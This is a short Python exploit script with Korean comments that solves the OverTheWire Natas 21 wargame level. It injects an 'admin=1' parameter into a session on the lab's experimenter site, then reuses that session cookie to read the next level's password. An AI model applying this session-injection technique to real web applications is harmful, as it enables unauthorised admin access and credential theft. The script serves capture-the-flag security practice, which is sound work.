import requests
import sys
import re

if len(sys.argv) != 2:
    print("[-] 비밀번호를 인자로 주세요.")
    print(f"    python {sys.argv[0]} natas21_password")
    sys.exit(1)

url = "http://natas21.natas.labs.overthewire.org/"
request_url = "http://natas21-experimenter.natas.labs.overthewire.org/"

natas21_cred = sys.argv[1]
boundary = "=" * 60

s = requests.Session()
s.auth = ("natas21", natas21_cred)


# experimenter는 받은 파라미터를 검증 없이 $_REQUEST째로 세션에 저장한다.
# 그래서 폼에 없는 admin=1을 끼워 보내면 그대로 세션에 박힌다. (submit 필수)
data = {"admin": "1", "submit": "Update"}
inject_cookie = s.post(request_url, data=data)

# 그냥 요청하면 해당 
sess_id = inject_cookie.cookies.get("PHPSESSID")
print(boundary)
print(f"[*] 쿠키값을 다른 페이지에도 적용하기 위해 추출 ===> {sess_id}")

# 같은 세션(PHPSESSID 공유)으로 메인 접속 → admin==1이라 비번이 노출된다.
cookies = {"PHPSESSID": sess_id}
response = s.get(url, cookies=cookies)
password = re.search(r"Password:\s*(\w+)", response.text)

if password:
    print(boundary)
    print(f"[+] payload ====> {data}")
    print(f"[+] natas22 비밀번호 ====> {password.group(1)}")
    print(boundary)
else:
    print(boundary)
    print("[-] 비번 못 찾음. 응답 전체:")
    print(response.text)
    print(boundary)
